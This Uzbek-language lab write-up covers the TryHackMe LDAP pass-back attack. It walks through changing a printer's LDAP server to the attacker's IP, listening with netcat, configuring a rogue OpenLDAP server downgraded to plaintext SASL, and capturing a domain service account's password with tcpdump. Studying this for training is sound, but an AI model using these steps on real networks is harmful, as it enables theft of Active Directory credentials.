**LDAP**

Ilovalarda Active Directory (AD) autentifikatsiyasi uchun yana bir usul bu **LDAP (Lightweight Directory Access Protocol)** autentifikatsiyasidir. LDAP autentifikatsiyasi NTLM autentifikatsiyasiga o‘xshaydi. Biroq, LDAP autentifikatsiyasida ilova foydalanuvchi ma’lumotlarini bevosita tekshiradi. Ilovaning o‘zida LDAP orqali so‘rov yuborish va keyin AD foydalanuvchisini tekshirish uchun bir juft AD hisob ma’lumotlari bo‘ladi.

LDAP autentifikatsiyasi odatda uchinchi tomon (ya’ni Microsoft bo‘lmagan) ilovalari tomonidan AD bilan integratsiya qilishda keng qo‘llaniladi. Bunday ilova va tizimlarga quyidagilar kiradi:

* Gitlab
* Jenkins
* Maxsus ishlab chiqilgan veb-ilovalar
* Printerlar
* VPNlar

Agar bu ilova yoki xizmatlardan birortasi internetga ochiq bo‘lsa, NTLM asosidagi tizimlarga qarshi qo‘llaniladigan hujumlar bu yerda ham amalga oshirilishi mumkin. Biroq, LDAP autentifikatsiyasi AD bilan ishlash uchun xizmatga AD hisob ma’lumotlari kerak bo‘lganligi sababli, bu holat qo‘shimcha hujum imkoniyatlarini yaratadi. Ya’ni, xizmatda ishlatiladigan AD hisob ma’lumotlarini qo‘lga kiritish orqali AD tizimiga autentifikatsiyalangan kirish imkoniyatini qo‘lga kiritish mumkin bo‘ladi.

Quyida LDAP orqali autentifikatsiya jarayoni ko‘rsatilgan:
*(rasmga ishora qilinmoqda)*

Agar to‘g‘ri serverga kirish imkoniyatiga ega bo‘lsak, masalan Gitlab serveri, unda ushbu AD hisob ma’lumotlarini tiklash ba’zida oddiygina konfiguratsiya fayllarini o‘qish orqali amalga oshiriladi. Bu hisob ma’lumotlari ko‘pincha konfiguratsiya fayllarida oddiy matn ko‘rinishida saqlanadi, chunki xavfsizlik modeli ularni yashirish o‘rniga server xavfsizligiga tayanadi.

![LDAP](https://github.com/akhatkulov/cheatsheets-for-windows/blob/main/Breaching%20Active%20Directory/LDAP%20Bind%20Credentials/d2f78ae2b44ef76453a80144dac86b4e.png?raw=true)

#### **LDAP Pass-back hujumi nima?**

LDAP autentifikatsiya mexanizmlariga qarshi amalga oshirilishi mumkin bo‘lgan juda qiziqarli hujum turlaridan biri bu — **LDAP Pass-back hujumi** deb ataladi. Bu hujum turli tarmoq qurilmalariga, masalan, printerlarga, foydalanuvchining ichki tarmoqqa kirish huquqi bo‘lsa (masalan, majlis xonasiga ruxsatsiz qurilma ulash orqali), keng qo‘llaniladi.

---

#### **LDAP Pass-back hujumi qanday ishlaydi?**

Agar biz biror qurilmaning, masalan printerning LDAP konfiguratsiyasiga kirish imkoniyatiga ega bo‘lsak, ushbu hujumni amalga oshirishimiz mumkin. Bu odatda printerning veb-interfeysi orqali amalga oshiriladi. Ko‘pincha bu interfeyslarda parol va loginlar `admin:admin` yoki `admin:password` tarzida standart holatda qoldirilgan bo‘ladi.

Bunday holatda, LDAP parolini interfeys orqali bevosita ko‘ra olmaymiz, chunki parol yashiringan bo‘ladi. **Ammo** biz LDAP konfiguratsiyasidagi **server IP-manzilini yoki hostname'ni** o‘zgartirishimiz mumkin.

Shunday qilib, **LDAP Pass-back hujumi** quyidagicha ishlaydi:

1. LDAP server IP-manzilini o‘z IP-manzilingizga (VPN IP) o‘zgartirasiz.
2. “Test Settings” (Sozlamalarni sinash) tugmasini bosasiz.
3. Printer sizning qurilmangizga LDAP autentifikatsiyasi qilishga urinadi.
4. Siz bu jarayonni tahlil qilib, **LDAP login ma’lumotlarini tutib olasiz**.

---

#### **LDAP Pass-back hujumini amalga oshirish:**

Bu tarmoqda bitta printer mavjud bo‘lib, uning admin interfeysi parol ham so‘ramaydi. Quyidagi havola orqali uning sozlamalar sahifasiga o‘ting:

🔗 `http://printer.za.tryhackme.com/settings.aspx`

Brauzer inspektsiyasi orqali printer sahifasida parol qaytarilmasligi (ya'ni, brauzerga yuborilmasligi)ni ham ko‘rish mumkin.

---

#### **Sinov: Printerni o‘z IP-manzilingizga bog‘lash**

1. Faqatgina login (username) mavjud, parol esa yashiringan.
2. “Test Settings” tugmasi bosilganda printer AD domen kontrolchisiga (LDAP serverga) autentifikatsiya so‘rovi yuboradi.
3. Biz bu jarayonni ekspluatatsiya qilib, printerni o‘zimizga ulanadigan qilib sozlaymiz.

🧪 **Netcat yordamida sinov**:

LDAP standarti bo‘yicha port: **389**

Quyidagi buyruqni ishga tushiring:

```bash
nc -lvp 389
```

> ⚠️ **Eslatma**: Agar siz TryHackMe AttackBox'dan foydalansangiz, avval `slapd` xizmatini o‘chirishingiz kerak:

```bash
sudo service slapd stop
```

So‘ngra, printer interfeysidagi **Server** oynasiga o‘z IP manzilingizni yozing (VPN IP-manzili: `10.50.x.x` yoki `10.51.x.x` ko‘rinishida bo‘ladi). IP’ni aniqlash uchun:

```bash
ip a
```

---

#### **Kutilayotgan natija:**

Netcat quyidagicha chiqishni ko‘rsatadi:

```bash
[thm@thm]$ nc -lvp 389
listening on [any] 389 ...
10.10.10.201: inverse host lookup failed: Unknown host
connect to [10.10.10.55] from (UNKNOWN) [10.10.10.201] 49765
0?DC?;
?
?x
 objectclass0?supportedCapabilities
```

> Bu yerda printer LDAP autentifikatsiyasini sizga yo‘llagan, lekin **muammo shundaki**, u hali sizga login/parolni yubormadi.

---

#### **Nega bu yetarli emas?**

Printer LDAP autentifikatsiyasining qanday usulini qo‘llashni aniqlash uchun avval **negotiation** (kelishuv) bosqichini boshlaydi. Agar bu usul xavfsiz bo‘lsa, **login va parol tarmoq orqali oddiy matn (plaintext) sifatida uzatilmaydi**.

Ba’zi xavfsiz autentifikatsiya turlarida esa **butunlay hech qanday credential tarmoq orqali yuborilmaydi!**

---


## 🛠 1. **OpenLDAP ni o‘rnatish (Arch Linux)**

Arch Linux’da `openldap` va `ldap-utils` (ya’ni `openldap-clients`) paketlarini o‘rnating:

```bash
sudo pacman -Syu openldap openldap-clients
```

## ⚙️ 2. **LDAP serverni sozlash (rogue server)**

LDAP konfiguratsiyasi fayllarini sozlash uchun quyidagilarni bajaring:

### Slapd xizmatini yoqish va ishga tushurish:

```bash
sudo systemctl enable slapd
sudo systemctl start slapd
```

### `slapd`ni qayta sozlash (Arch’da `dpkg-reconfigure` yo‘q, shuning uchun qo‘lda qilamiz)

LDAP konfiguratsiyasi `/etc/openldap/slapd.d/` yoki `/etc/openldap/slapd.conf` orqali boshqariladi.

Sizga kerak bo‘ladi:

* `dc=za,dc=tryhackme,dc=com` domen sifatida
* `MDB` backend
* `cn=admin,dc=za,dc=tryhackme,dc=com` foydalanuvchi
* oddiy parol (masalan `password11`)

Buni `slapd.conf` orqali qilish mumkin yoki `ldapadd` bilan `.ldif` fayllar yaratib qo‘shish mumkin.

---

## 🔐 3. **LDAP ni zaiflashtirish (authentication downgrade qilish)**

Quyidagi faylni `olcSaslSecProps.ldif` nomi bilan saqlang:

```ldif
# olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

So‘ng quyidagi buyruqni bajaring:

```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:/// -f ./olcSaslSecProps.ldif
sudo systemctl restart slapd
```

---

## ✅ 4. **Sozlamalarni tekshirish**

Yuborilgan autentifikatsiya usullarini tekshirish:

```bash
ldapsearch -H ldap://localhost -x -LLL -s base -b "" supportedSASLMechanisms
```

Kutilgan natija:

```
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

---

## 🧲 5. **Parollarni tutib olish (TCPDump)**

Avval IP manzilingizni toping (masalan: `ip a`):

```bash
ip a
```

So‘ng TCPDump orqali port 389 ni kuzating (interfeys nomi: `enpXsY`, `wlan0`, `eth0` bo‘lishi mumkin):

```bash
sudo tcpdump -SX -i <interface_name> tcp port 389
```

`Test Settings` tugmasini printer sahifasidan ([http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx)) bir necha marta bosing.

Natijada `za.tryhackme.com\svcLDAP` va uning paroli kabi credential’lar ochiq ko‘rinishda TCPDump’da ko‘rinadi.

---

## 🔚 Yakuniy natija:

Siz Active Directory foydalanuvchi ismi va parolini **ochiq matn** ko‘rinishida qo‘lga kiritdingiz:

```
username: za.tryhackme.com\svcLDAP
password: password11 (yoki sizda boshqacha bo‘ladi)
```
